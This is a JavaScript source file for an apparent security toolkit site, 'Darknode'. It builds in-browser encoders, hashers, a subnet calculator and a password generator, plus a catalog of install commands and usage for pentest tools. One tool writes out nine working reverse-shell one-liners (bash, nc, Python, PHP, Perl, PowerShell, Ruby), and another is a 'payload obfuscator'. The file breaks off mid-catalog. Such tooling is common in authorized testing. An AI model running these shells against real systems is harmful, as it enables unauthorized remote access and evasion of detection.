// Darknode toolkit. "browser" tools run 100% in-page and actually work.
// "local" tools run on the user's own machine (a website can't), so they show an
// install command. renderTools() (tools.js) builds the searchable catalog + modal.

const enc = new TextEncoder();
const hexOf = (buf) => [...new Uint8Array(buf)].map((b) => b.toString(16).padStart(2, "0")).join("");
const b64e = (s) => btoa(unescape(encodeURIComponent(s)));
const b64d = (s) => decodeURIComponent(escape(atob(s.trim())));
const rot13 = (s) => s.replace(/[a-z]/gi, (c) => String.fromCharCode((c <= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26));

// Standard input -> transform -> output tool.
function io(root, ops, ph = "Input") {
  root.innerHTML = `
    <textarea class="tk-in" rows="4" placeholder="${ph}"></textarea>
    <div class="tk-btns">${ops.map((o, i) => `<button class="btn sm" data-i="${i}">${o.label}</button>`).join("")}</div>
    <pre class="tk-out"></pre>`;
  const inp = root.querySelector(".tk-in"), out = root.querySelector(".tk-out");
  root.querySelector(".tk-btns").onclick = async (e) => {
    const b = e.target.closest("button[data-i]"); if (!b) return;
    try { out.textContent = await ops[+b.dataset.i].fn(inp.value); }
    catch (err) { out.textContent = "Error: " + err.message; }
  };
}

// ---- browser tool implementations ----
const B = {
  base64: (r) => io(r, [{ label: "Encode", fn: b64e }, { label: "Decode", fn: b64d }]),
  url: (r) => io(r, [{ label: "Encode", fn: (s) => encodeURIComponent(s) }, { label: "Decode", fn: (s) => decodeURIComponent(s) }]),
  hex: (r) => io(r, [
    { label: "Text -> Hex", fn: (s) => [...enc.encode(s)].map((b) => b.toString(16).padStart(2, "0")).join(" ") },
    { label: "Hex -> Text", fn: (s) => new TextDecoder().decode(new Uint8Array(s.trim().split(/\s+/).map((h) => parseInt(h, 16)))) },
  ]),
  html: (r) => io(r, [
    { label: "Encode", fn: (s) => s.replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c])) },
    { label: "Decode", fn: (s) => { const t = document.createElement("textarea"); t.innerHTML = s; return t.value; } },
  ]),
  rot13: (r) => io(r, [{ label: "ROT13", fn: rot13 }]),
  case: (r) => io(r, [
    { label: "UPPER", fn: (s) => s.toUpperCase() }, { label: "lower", fn: (s) => s.toLowerCase() },
    { label: "Title", fn: (s) => s.replace(/\w\S*/g, (w) => w[0].toUpperCase() + w.slice(1).toLowerCase()) },
    { label: "snake_case", fn: (s) => s.trim().replace(/\s+/g, "_").toLowerCase() },
    { label: "kebab-case", fn: (s) => s.trim().replace(/\s+/g, "-").toLowerCase() },
  ]),
  hash: (r) => io(r, ["SHA-1", "SHA-256", "SHA-384", "SHA-512"].map((a) => ({
    label: a, fn: async (s) => a + ": " + hexOf(await crypto.subtle.digest(a, enc.encode(s))),
  })), "Text to hash"),
  jwt: (r) => io(r, [{ label: "Decode", fn: (s) => {
    const p = s.trim().split("."); if (p.length < 2) throw new Error("not a JWT");
    const d = (x) => JSON.stringify(JSON.parse(b64d(x.replace(/-/g, "+").replace(/_/g, "/"))), null, 2);
    return "HEADER\n" + d(p[0]) + "\n\nPAYLOAD\n" + d(p[1]);
  } }], "Paste a JWT (header.payload.signature)"),
  obfuscate: (r) => io(r, [
    { label: "Base64", fn: b64e },
    { label: "Hex \\xNN", fn: (s) => [...enc.encode(s)].map((b) => "\\x" + b.toString(16).padStart(2, "0")).join("") },
    { label: "URL", fn: (s) => [...enc.encode(s)].map((b) => "%" + b.toString(16).padStart(2, "0")).join("") },
    { label: "Unicode", fn: (s) => [...s].map((c) => "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0")).join("") },
  ], "Payload to obfuscate"),
  baseconv: (r) => io(r, [
    { label: "-> bin", fn: (s) => parseInt(s.trim()).toString(2) }, { label: "-> oct", fn: (s) => parseInt(s.trim()).toString(8) },
    { label: "-> hex", fn: (s) => parseInt(s.trim()).toString(16) }, { label: "hex -> dec", fn: (s) => parseInt(s.trim(), 16).toString(10) },
    { label: "bin -> dec", fn: (s) => parseInt(s.trim(), 2).toString(10) },
  ], "A number"),

  revshell: (r) => {
    r.innerHTML = `
      <div class="tk-row"><input class="tk-f" id="rs-ip" placeholder="LHOST e.g. 10.0.0.1" value="10.0.0.1">
      <input class="tk-f" id="rs-port" placeholder="LPORT" value="4444" style="max-width:110px"></div>
      <div class="tk-btns" id="rs-langs"></div><pre class="tk-out" id="rs-out"></pre>`;
    const langs = {
      bash: (i, p) => `bash -i >& /dev/tcp/${i}/${p} 0>&1`,
      "bash UDP": (i, p) => `sh -i >& /dev/udp/${i}/${p} 0>&1`,
      nc: (i, p) => `nc -e /bin/sh ${i} ${p}`,
      "nc mkfifo": (i, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${i} ${p} >/tmp/f`,
      python3: (i, p) => `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${i}",${p}));[os.dup2(s.fileno(),f) for f in(0,1,2)];import pty;pty.spawn("/bin/sh")'`,
      php: (i, p) => `php -r '$s=fsockopen("${i}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`,
      perl: (i, p) => `perl -e 'use Socket;$i="${i}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`,
      powershell: (i, p) => `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('${i}',${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($n=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$n);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}"`,
      ruby: (i, p) => `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${i}","${p}");loop{c.write(\`#{c.gets}\`)}'`,
    };
    r.querySelector("#rs-langs").innerHTML = Object.keys(langs).map((l) => `<button class="btn sm" data-l="${l}">${l}</button>`).join("");
    r.querySelector("#rs-langs").onclick = (e) => {
      const b = e.target.closest("button[data-l]"); if (!b) return;
      const i = r.querySelector("#rs-ip").value.trim(), p = r.querySelector("#rs-port").value.trim();
      r.querySelector("#rs-out").textContent = langs[b.dataset.l](i, p);
    };
  },

  subnet: (r) => io(r, [{ label: "Calculate", fn: (s) => {
    const [ip, bs] = s.trim().split("/"); const bits = +bs, oct = (ip || "").split(".").map(Number);
    if (oct.length !== 4 || oct.some((o) => !(o >= 0 && o <= 255)) || !(bits >= 0 && bits <= 32)) throw new Error("bad CIDR, e.g. 192.168.1.0/24");
    const ipn = oct.reduce((a, o) => a * 256 + o, 0) >>> 0, mask = bits === 0 ? 0 : (0xFFFFFFFF << (32 - bits)) >>> 0;
    const net = (ipn & mask) >>> 0, bc = (net | (~mask >>> 0)) >>> 0, toIp = (n) => [24, 16, 8, 0].map((s2) => (n >>> s2) & 255).join(".");
    const hosts = bits >= 31 ? 0 : bc - net - 1;
    return `Network:    ${toIp(net)}\nBroadcast:  ${toIp(bc)}\nNetmask:    ${toIp(mask)}  (/${bits})\nFirst host: ${bits >= 31 ? "n/a" : toIp(net + 1)}\nLast host:  ${bits >= 31 ? "n/a" : toIp(bc - 1)}\nUsable:     ${hosts}`;
  } }], "CIDR e.g. 192.168.1.0/24"),

  passgen: (r) => {
    r.innerHTML = `
      <div class="tk-row">Length <input class="tk-f" id="pg-len" type="number" value="20" min="4" max="128" style="max-width:90px">
      <label><input type="checkbox" id="pg-sym" checked> symbols</label></div>
      <div class="tk-btns"><button class="btn sm" id="pg-go">Generate</button></div><pre class="tk-out" id="pg-out"></pre>`;
    r.querySelector("#pg-go").onclick = () => {
      const n = Math.max(4, Math.min(128, +r.querySelector("#pg-len").value || 20));
      let cs = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      if (r.querySelector("#pg-sym").checked) cs += "!@#$%^&*()-_=+[]{};:,.?";
      // Rejection-sample to avoid modulo bias: discard draws in the unusable
      // tail (>= largest multiple of cs.length that fits in a uint32).
      const max = Math.floor(0x100000000 / cs.length) * cs.length, out = [], buf = new Uint32Array(n);
      while (out.length < n) {
        crypto.getRandomValues(buf);
        for (let k = 0; k < buf.length && out.length < n; k++) if (buf[k] < max) out.push(cs[buf[k] % cs.length]);
      }
      r.querySelector("#pg-out").textContent = out.join("");
    };
  },
  uuid: (r) => { r.innerHTML = `<div class="tk-btns"><button class="btn sm" id="u-go">Generate UUID v4</button></div><pre class="tk-out" id="u-out"></pre>`;
    r.querySelector("#u-go").onclick = () => { r.querySelector("#u-out").textContent = crypto.randomUUID(); }; },
  epoch: (r) => io(r, [
    { label: "Now (epoch)", fn: () => Math.floor(Date.now() / 1000) + "" },
    { label: "Epoch -> date", fn: (s) => new Date(+s.trim() * (s.trim().length > 11 ? 1 : 1000)).toString() },
  ], "Unix timestamp"),
};

// ---- extra browser tools ----
const hexToHsl = (hex) => {
  hex = hex.replace("#", "");
  const r = parseInt(hex.slice(0, 2), 16) / 255, g = parseInt(hex.slice(2, 4), 16) / 255, b = parseInt(hex.slice(4, 6), 16) / 255;
  const mx = Math.max(r, g, b), mn = Math.min(r, g, b); let h = 0, s = 0, l = (mx + mn) / 2;
  if (mx !== mn) { const d = mx - mn; s = l > .5 ? d / (2 - mx - mn) : d / (mx + mn); h = mx === r ? (g - b) / d + (g < b ? 6 : 0) : mx === g ? (b - r) / d + 2 : (r - g) / d + 4; h /= 6; }
  return `hsl(${Math.round(h * 360)}, ${Math.round(s * 100)}%, ${Math.round(l * 100)}%)`;
};
const MORSE = { A: ".-", B: "-...", C: "-.-.", D: "-..", E: ".", F: "..-.", G: "--.", H: "....", I: "..", J: ".---", K: "-.-", L: ".-..", M: "--", N: "-.", O: "---", P: ".--.", Q: "--.-", R: ".-.", S: "...", T: "-", U: "..-", V: "...-", W: ".--", X: "-..-", Y: "-.--", Z: "--..", "0": "-----", "1": ".----", "2": "..---", "3": "...--", "4": "....-", "5": ".....", "6": "-....", "7": "--...", "8": "---..", "9": "----." };
const MORSE_R = Object.fromEntries(Object.entries(MORSE).map(([k, v]) => [v, k]));
const B32 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
function base32enc(s) { let bits = ""; for (const b of enc.encode(s)) bits += b.toString(2).padStart(8, "0"); let out = ""; for (let i = 0; i < bits.length; i += 5) out += B32[parseInt(bits.slice(i, i + 5).padEnd(5, "0"), 2)]; while (out.length % 8) out += "="; return out; }
function base32dec(s) { s = s.replace(/=+$/, "").toUpperCase(); let bits = ""; for (const c of s) { const v = B32.indexOf(c); if (v >= 0) bits += v.toString(2).padStart(5, "0"); } const bytes = []; for (let i = 0; i + 8 <= bits.length; i += 8) bytes.push(parseInt(bits.slice(i, i + 8), 2)); return new TextDecoder().decode(new Uint8Array(bytes)); }

B.jsonfmt = (r) => io(r, [{ label: "Format", fn: (s) => JSON.stringify(JSON.parse(s), null, 2) }, { label: "Minify", fn: (s) => JSON.stringify(JSON.parse(s)) }], "Paste JSON");
B.csvjson = (r) => io(r, [{ label: "CSV -> JSON", fn: (s) => { const rows = s.trim().split(/\r?\n/).map((l) => l.split(",")); const head = rows.shift().map((h) => h.trim()); return JSON.stringify(rows.map((rw) => Object.fromEntries(head.map((h, i) => [h, (rw[i] || "").trim()]))), null, 2); } }], "header row, then data rows");
B.unicode = (r) => io(r, [{ label: "Code points", fn: (s) => [...s].map((c) => c + "  U+" + c.codePointAt(0).toString(16).toUpperCase().padStart(4, "0")).join("\n") }]);
B.base32 = (r) => io(r, [{ label: "Encode", fn: base32enc }, { label: "Decode", fn: base32dec }]);
B.binary = (r) => io(r, [{ label: "Text -> Binary", fn: (s) => [...enc.encode(s)].map((b) => b.toString(2).padStart(8, "0")).join(" ") }, { label: "Binary -> Text", fn: (s) => new TextDecoder().decode(new Uint8Array(s.trim().split(/\s+/).map((b) => parseInt(b, 2)))) }]);
B.morse = (r) => io(r, [{ label: "Text -> Morse", fn: (s) => s.toUpperCase().split("").map((c) => c === " " ? "/" : (MORSE[c] || "")).join(" ").trim() }, { label: "Morse -> Text", fn: (s) => s.trim().split(" ").map((c) => c === "/" ? " " : (MORSE_R[c] || "")).join("") }]);
B.jsescape = (r) => io(r, [{ label: "Escape", fn: (s) => JSON.stringify(s).slice(1, -1) }, { label: "Unescape", fn: (s) => JSON.parse('"' + s.replace(/"/g, '\\"') + '"') }]);
B.caesar = (r) => { r.innerHTML = `<div class="tk-row">Shift <input class="tk-f" id="cz-n" type="number" value="3" style="max-width:90px"></div><textarea class="tk-in" id="cz-in" rows="3" placeholder="Text"></textarea><div class="tk-btns"><button class="btn sm" id="cz-go">Shift</button></div><pre class="tk-out" id="cz-out"></pre>`; r.querySelector("#cz-go").onclick = () => { const n = ((+r.querySelector("#cz-n").value % 26) + 26) % 26; r.querySelector("#cz-out").textContent = r.querySelector("#cz-in").value.replace(/[a-z]/gi, (c) => { const base = c <= "Z" ? 65 : 97; return String.fromCharCode((c.charCodeAt(0) - base + n) % 26 + base); }); }; };
B.xor = (r) => { r.innerHTML = `<div class="tk-row">Key <input class="tk-f" id="xr-k" placeholder="key"></div><textarea class="tk-in" id="xr-in" rows="3" placeholder="Text"></textarea><div class="tk-btns"><button class="btn sm" id="xr-go">XOR -> hex</button></div><pre class="tk-out" id="xr-out"></pre>`; r.querySelector("#xr-go").onclick = () => { const kb = enc.encode(r.querySelector("#xr-k").value || " "); r.querySelector("#xr-out").textContent = [...enc.encode(r.querySelector("#xr-in").value)].map((b, i) => (b ^ kb[i % kb.length]).toString(16).padStart(2, "0")).join(""); }; };
B.hmac = (r) => { r.innerHTML = `<div class="tk-row">Key <input class="tk-f" id="hm-k" placeholder="secret"></div><textarea class="tk-in" id="hm-in" rows="3" placeholder="Message"></textarea><div class="tk-btns"><button class="btn sm" id="hm-go">HMAC-SHA256</button></div><pre class="tk-out" id="hm-out"></pre>`; r.querySelector("#hm-go").onclick = async () => { try { const key = await crypto.subtle.importKey("raw", enc.encode(r.querySelector("#hm-k").value), { name: "HMAC", hash: "SHA-256" }, false, ["sign"]); r.querySelector("#hm-out").textContent = hexOf(await crypto.subtle.sign("HMAC", key, enc.encode(r.querySelector("#hm-in").value))); } catch (e) { r.querySelector("#hm-out").textContent = "Error: " + e.message; } }; };
B.entropy = (r) => io(r, [{ label: "Shannon entropy", fn: (s) => { if (!s) return "0"; const f = {}; for (const c of s) f[c] = (f[c] || 0) + 1; let e = 0; for (const k in f) { const p = f[k] / s.length; e -= p * Math.log2(p); } return e.toFixed(4) + " bits/char  (" + (e * s.length).toFixed(1) + " bits total)"; } }]);
B.slug = (r) => io(r, [{ label: "Slugify", fn: (s) => s.toLowerCase().trim().replace(/[^a-z0-9]+/g, "-").replace(/^-+|-+$/g, "") }]);
B.wordcount = (r) => io(r, [{ label: "Count", fn: (s) => `Characters: ${s.length}\nWords: ${(s.trim().match(/\S+/g) || []).length}\nLines: ${s.split(/\n/).length}` }]);
B.lorem = (r) => { const W = "lorem ipsum dolor sit amet consectetur adipiscing elit sed do eiusmod tempor incididunt ut labore et dolore magna aliqua enim ad minim veniam quis nostrud".split(" "); r.innerHTML = `<div class="tk-row">Paragraphs <input class="tk-f" id="lo-n" type="number" value="2" min="1" max="10" style="max-width:90px"></div><div class="tk-btns"><button class="btn sm" id="lo-go">Generate</button></div><pre class="tk-out" id="lo-out"></pre>`; r.querySelector("#lo-go").onclick = () => { const n = Math.max(1, Math.min(10, +r.querySelector("#lo-n").value || 2)); const p = () => Array.from({ length: 40 }, () => W[Math.floor(Math.random() * W.length)]).join(" "); r.querySelector("#lo-out").textContent = Array.from({ length: n }, p).join("\n\n"); }; };
B.regex = (r) => { r.innerHTML = `<div class="tk-row"><input class="tk-f" id="rx-p" placeholder="pattern e.g. \\d+"><input class="tk-f" id="rx-f" placeholder="flags" value="g" style="max-width:80px"></div><textarea class="tk-in" id="rx-in" rows="4" placeholder="Test string"></textarea><div class="tk-btns"><button class="btn sm" id="rx-go">Match</button></div><pre class="tk-out" id="rx-out"></pre>`; r.querySelector("#rx-go").onclick = () => { try { const re = new RegExp(r.querySelector("#rx-p").value, r.querySelector("#rx-f").value); const m = [...r.querySelector("#rx-in").value.matchAll(re)]; r.querySelector("#rx-out").textContent = m.length ? m.map((x, i) => `${i}: ${x[0]}`).join("\n") : "no matches"; } catch (e) { r.querySelector("#rx-out").textContent = "Error: " + e.message; } }; };
B.color = (r) => io(r, [{ label: "Hex -> RGB", fn: (s) => { const n = parseInt(s.trim().replace("#", ""), 16); return `rgb(${(n >> 16) & 255}, ${(n >> 8) & 255}, ${n & 255})`; } }, { label: "Hex -> HSL", fn: (s) => hexToHsl(s.trim()) }], "#00d4ff");
B.ip2int = (r) => io(r, [{ label: "IP -> int", fn: (s) => String(s.trim().split(".").reduce((a, o) => a * 256 + (+o), 0) >>> 0) }, { label: "int -> IP", fn: (s) => { const n = (+s.trim()) >>> 0; return [24, 16, 8, 0].map((sh) => (n >>> sh) & 255).join("."); } }], "192.168.1.1");

// id, name, category, kind, desc, and (browser) render / (local) install command.
export const CATALOG = [
  // --- browser (work in-page) ---
  { id: "base64", name: "Base64", cat: "Encoding", kind: "browser", desc: "Encode / decode Base64", render: B.base64 },
  { id: "url", name: "URL encode", cat: "Encoding", kind: "browser", desc: "Percent-encode / decode", render: B.url },
  { id: "hex", name: "Hex converter", cat: "Encoding", kind: "browser", desc: "Text <-> hex bytes", render: B.hex },
  { id: "html", name: "HTML entities", cat: "Encoding", kind: "browser", desc: "Encode / decode HTML entities", render: B.html },
  { id: "baseconv", name: "Base converter", cat: "Encoding", kind: "browser", desc: "bin / oct / dec / hex", render: B.baseconv },
  { id: "rot13", name: "ROT13", cat: "Crypto", kind: "browser", desc: "ROT13 cipher", render: B.rot13 },
  { id: "hash", name: "Hash generator", cat: "Crypto", kind: "browser", desc: "SHA-1/256/384/512", render: B.hash },
  { id: "jwt", name: "JWT decoder", cat: "Crypto", kind: "browser", desc: "Decode a JWT's header + payload", render: B.jwt },
  { id: "case", name: "Case converter", cat: "Text", kind: "browser", desc: "UPPER / lower / Title / snake / kebab", render: B.case },
  { id: "passgen", name: "Password generator", cat: "Text", kind: "browser", desc: "Strong random password", render: B.passgen },
  { id: "uuid", name: "UUID generator", cat: "Text", kind: "browser", desc: "Random UUID v4", render: B.uuid },
  { id: "epoch", name: "Epoch converter", cat: "Text", kind: "browser", desc: "Unix time <-> date", render: B.epoch },
  { id: "subnet", name: "Subnet calculator", cat: "Network", kind: "browser", desc: "CIDR -> network / range / hosts", render: B.subnet },
  { id: "revshell", name: "Reverse shell", cat: "Payloads", kind: "browser", desc: "Reverse-shell one-liners, 9 flavors", render: B.revshell },
  { id: "obfuscate", name: "Payload obfuscator", cat: "Payloads", kind: "browser", desc: "Base64 / hex / url / unicode", render: B.obfuscate },
  { id: "jsonfmt", name: "JSON formatter", cat: "Data", kind: "browser", desc: "Pretty-print or minify JSON", render: B.jsonfmt },
  { id: "csvjson", name: "CSV to JSON", cat: "Data", kind: "browser", desc: "Convert CSV into JSON", render: B.csvjson },
  { id: "unicode", name: "Unicode inspector", cat: "Data", kind: "browser", desc: "Character code points", render: B.unicode },
  { id: "color", name: "Color converter", cat: "Data", kind: "browser", desc: "Hex to RGB / HSL", render: B.color },
  { id: "base32", name: "Base32", cat: "Encoding", kind: "browser", desc: "Encode / decode Base32", render: B.base32 },
  { id: "binary", name: "Binary", cat: "Encoding", kind: "browser", desc: "Text and binary", render: B.binary },
  { id: "morse", name: "Morse code", cat: "Encoding", kind: "browser", desc: "Text and Morse", render: B.morse },
  { id: "jsescape", name: "JS string escape", cat: "Encoding", kind: "browser", desc: "Escape / unescape", render: B.jsescape },
  { id: "caesar", name: "Caesar cipher", cat: "Crypto", kind: "browser", desc: "Shift cipher", render: B.caesar },
  { id: "xor", name: "XOR cipher", cat: "Crypto", kind: "browser", desc: "XOR a key over text", render: B.xor },
  { id: "hmac", name: "HMAC-SHA256", cat: "Crypto", kind: "browser", desc: "Keyed hash", render: B.hmac },
  { id: "entropy", name: "Entropy", cat: "Crypto", kind: "browser", desc: "Shannon entropy of text", render: B.entropy },
  { id: "regex", name: "Regex tester", cat: "Text", kind: "browser", desc: "Test a regular expression", render: B.regex },
  { id: "slug", name: "Slugify", cat: "Text", kind: "browser", desc: "URL-friendly slug", render: B.slug },
  { id: "wordcount", name: "Word counter", cat: "Text", kind: "browser", desc: "Chars / words / lines", render: B.wordcount },
  { id: "lorem", name: "Lorem ipsum", cat: "Text", kind: "browser", desc: "Placeholder text", render: B.lorem },
  { id: "ip2int", name: "IP and integer", cat: "Network", kind: "browser", desc: "IPv4 to integer and back", render: B.ip2int },

  // --- setup (install locally) ---
  { id: "vscode", name: "VS Code", cat: "Setup", kind: "local", desc: "Code editor", cmd: "sudo snap install code --classic" },
  { id: "git", name: "Git", cat: "Setup", kind: "local", desc: "Version control", cmd: "sudo apt install -y git" },
  { id: "python", name: "Python", cat: "Setup", kind: "local", desc: "Language + pip", cmd: "sudo apt install -y python3 python3-pip" },
  { id: "node", name: "Node.js", cat: "Setup", kind: "local", desc: "JS runtime + npm", cmd: "sudo apt install -y nodejs npm" },
  { id: "ollama", name: "Ollama", cat: "Setup", kind: "local", desc: "Local LLM runner -- installed for you by the Darknode CLI", cmd: "darknode setup" },

  // --- local (run on your machine; a website can't) ---
  ...[
    ["nmap", "Nmap", "Recon", "Port/service scanner", "sudo apt install -y nmap"],
    ["masscan", "masscan", "Recon", "Mass IP port scanner", "sudo apt install -y masscan"],
    ["rustscan", "RustScan", "Recon", "Fast port scanner", "sudo apt install -y rustscan"],
    ["subfinder", "subfinder", "Recon", "Subdomain discovery", "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"],
    ["amass", "amass", "Recon", "Attack-surface mapping", "sudo apt install -y amass"],
    ["theharvester", "theHarvester", "Recon", "OSINT emails/hosts", "sudo apt install -y theharvester"],
    ["httpx", "httpx", "Recon", "HTTP probing", "go install github.com/projectdiscovery/httpx/cmd/httpx@latest"],
    ["gobuster", "gobuster", "Web", "Dir/vhost brute", "sudo apt install -y gobuster"],
    ["ffuf", "ffuf", "Web", "Web fuzzer", "sudo apt install -y ffuf"],
    ["feroxbuster", "feroxbuster", "Web", "Content discovery", "sudo apt install -y feroxbuster"],
    ["nikto", "Nikto", "Web", "Web server scanner", "sudo apt install -y nikto"],
    ["wafw00f", "wafw00f", "Web", "WAF fingerprint", "sudo apt install -y wafw00f"],
    ["sqlmap", "sqlmap", "Web", "SQLi automation", "sudo apt install -y sqlmap"],
    ["dalfox", "Dalfox", "Web", "XSS scanner", "go install github.com/hahwul/dalfox/v2@latest"],
    ["katana", "katana", "Web", "Crawler", "go install github.com/projectdiscovery/katana/cmd/katana@latest"],
    ["hydra", "hydra", "Passwords", "Login brute-forcer", "sudo apt install -y hydra"],
    ["hashcat", "hashcat", "Passwords", "GPU hash cracking", "sudo apt install -y hashcat"],
    ["john", "John the Ripper", "Passwords", "Password cracker", "sudo apt install -y john"],
    ["crackmapexec", "CrackMapExec", "Passwords", "AD/SMB sweep", "pipx install crackmapexec"],
    ["metasploit", "Metasploit", "Exploitation", "Exploit framework", "sudo apt install -y metasploit-framework"],
    ["searchsploit", "searchsploit", "Exploitation", "Exploit-DB search", "sudo apt install -y exploitdb"],
    ["impacket", "impacket", "Post-ex", "Windows/AD tooling", "pipx install impacket"],
    ["linpeas", "LinPEAS", "Post-ex", "Linux privesc audit", "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh"],
    ["aircrack", "aircrack-ng", "Wireless", "Wi-Fi cracking suite", "sudo apt install -y aircrack-ng"],
    ["wifite", "wifite", "Wireless", "Automated Wi-Fi attacks", "sudo apt install -y wifite"],
    ["proxychains", "proxychains", "Anonymity", "Route tools via proxy", "sudo apt install -y proxychains4"],
    ["tor", "Tor", "Anonymity", "Onion routing", "sudo apt install -y tor"],
    ["dnsx", "dnsx", "Recon", "Fast DNS toolkit", "go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest"],
    ["assetfinder", "assetfinder", "Recon", "Find related domains", "go install github.com/tomnomnom/assetfinder@latest"],
    ["waybackurls", "waybackurls", "Recon", "Archived URL discovery", "go install github.com/tomnomnom/waybackurls@latest"],
    ["whatweb", "WhatWeb", "Recon", "Web tech fingerprint", "sudo apt install -y whatweb"],
    ["dnsrecon", "dnsrecon", "Recon", "DNS enumeration", "sudo apt install -y dnsrecon"],
    ["gitleaks", "Gitleaks", "Recon", "Find secrets in repos", "go install github.com/gitleaks/gitleaks/v8@latest"],
    ["arjun", "Arjun", "Web", "HTTP parameter discovery", "pipx install arjun"],
    ["dirb", "dirb", "Web", "Directory brute-forcer", "sudo apt install -y dirb"],
    ["wfuzz", "wfuzz", "Web", "Web fuzzer", "sudo apt install -y wfuzz"],
    ["nuclei", "nuclei", "Web", "Template-based scanner", "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"],
    ["commix", "commix", "Web", "Command-injection exploiter", "sudo apt install -y commix"],
    ["medusa", "medusa", "Passwords", "Parallel brute-forcer", "sudo apt install -y medusa"],
    ["patator", "patator", "Passwords", "Multi-purpose brute-forcer", "pipx install patator"],
    ["responder", "Responder", "Post-ex", "LLMNR/NBT-NS poisoner", "pipx install responder"],
    ["bloodhound", "BloodHound", "Post-ex", "AD attack-path mapping", "sudo apt install -y bloodhound"],
    ["wireshark", "Wireshark", "Sniffing", "Packet analyzer (GUI)", "sudo apt install -y wireshark"],
    ["tcpdump", "tcpdump", "Sniffing", "CLI packet capture", "sudo apt install -y tcpdump"],
    ["binwalk", "binwalk", "Forensics", "Firmware/file carving", "sudo apt install -y binwalk"],
    ["volatility", "Volatility 3", "Forensics", "Memory forensics", "pipx install volatility3"],
    ["exiftool", "ExifTool", "Forensics", "File metadata reader", "sudo apt install -y libimage-exiftool-perl"],
  ].map(([id, name, cat, desc, cmd]) => ({ id, name, cat, kind: "local", desc, cmd })),

  // =========================================================================
  //  EXPANDED LOCAL TOOLS -- detailed entries with install, usage, flags, links
  // =========================================================================

  // ---------------------------------------------------------------------------
  //  Recon
  // ---------------------------------------------------------------------------

  {
    id: "httprobe",
    name: "httprobe",
    cat: "Recon",
    kind: "local",
    desc: "Probe a list of domains to find working HTTP and HTTPS servers, filtering out dead hosts quickly",
    install: "go install github.com/tomnomnom/httprobe@latest",
    usage: [
      "cat domains.txt | httprobe",
      "cat domains.txt | httprobe -p http:8080 -p https:8443",
      "cat domains.txt | httprobe -s -p https:443",
      "cat domains.txt | httprobe -c 50 | tee alive.txt",
      "subfinder -d example.com -silent | httprobe -prefer-https",
    ],
    flags: [
      { flag: "-p", desc: "Add additional probe port (e.g. http:8080, https:8443)" },
      { flag: "-c", desc: "Concurrency level (default 20)" },
      { flag: "-s", desc: "Skip the default probes on port 80 and 443" },
      { flag: "-t", desc: "Timeout in milliseconds (default 10000)" },
      { flag: "-prefer-https", desc: "Only output HTTPS if both HTTP and HTTPS respond" },
    ],
    links: "https://github.com/tomnomnom/httprobe",
  },

  {
    id: "gau",
    name: "gau",
    cat: "Recon",
    kind: "local",
    desc: "GetAllUrls -- fetch known URLs from AlienVault OTX, Wayback Machine, and Common Crawl for a domain",
    install: "go install github.com/lc/gau/v2/cmd/gau@latest",
    usage: [
      "gau example.com",
      "gau --threads 5 example.com",
      "gau --subs example.com",
      "echo example.com | gau --blacklist png,jpg,gif",
      "gau --o urls.txt --providers wayback,otx example.com",
    ],
    flags: [
      { flag: "--threads", desc: "Number of threads (default 1)" },
      { flag: "--subs", desc: "Include subdomains of the target" },
      { flag: "--providers", desc: "Specify providers: wayback, commoncrawl, otx, urlscan" },
      { flag: "--blacklist", desc: "Comma-separated list of extensions to skip" },
      { flag: "--o", desc: "Output file path" },
      { flag: "--from", desc: "Fetch URLs from this date (YYYYMM)" },
      { flag: "--to", desc: "Fetch URLs until this date (YYYYMM)" },
    ],
    links: "https://github.com/lc/gau",
  },

  {
    id: "hakrawler",
    name: "hakrawler",
    cat: "Recon",
    kind: "local",
    desc: "Fast web crawler designed for quick discovery of endpoints and assets within a web application",
    install: "go install github.com/hakluke/hakrawler@latest",
    usage: [
      "echo https://example.com | hakrawler",
      "echo https://example.com | hakrawler -d 3",
      "echo https://example.com | hakrawler -subs",
      "echo https://example.com | hakrawler -plain",
      "cat urls.txt | hakrawler -t 10 -d 2",
    ],
    flags: [
      { flag: "-d", desc: "Depth to crawl (default 2)" },
      { flag: "-subs", desc: "Include subdomains in crawl scope" },
      { flag: "-t", desc: "Number of threads (default 8)" },
      { flag: "-plain", desc: "Output only plain URLs, no extra info" },
      { flag: "-insecure", desc: "Disable TLS certificate verification" },
      { flag: "-u", desc: "Show only unique URLs" },
    ],
    links: "https://github.com/hakluke/hakrawler",
  },

  {
    id: "shodan-cli",
    name: "Shodan CLI",
    cat: "Recon",
    kind: "local",
    desc: "Command-line interface for the Shodan search engine -- query internet-facing devices and services",
    install: "pip install shodan",
    usage: [
      "shodan init YOUR_API_KEY",
      "shodan host 8.8.8.8",
      "shodan search 'apache country:US'",
      "shodan count 'port:22 country:DE'",
      "shodan stats --facets country 'nginx'",
    ],
    flags: [
      { flag: "init", desc: "Initialize with your Shodan API key" },
      { flag: "host", desc: "View all information for a given IP" },
      { flag: "search", desc: "Search Shodan with filters" },
      { flag: "count", desc: "Return result count for a query" },
      { flag: "stats", desc: "Show faceted statistics for a query" },
      { flag: "scan submit", desc: "Request Shodan to scan a network" },
    ],
    links: "https://cli.shodan.io/",
  },

  {
    id: "recon-ng",
    name: "Recon-ng",
    cat: "Recon",
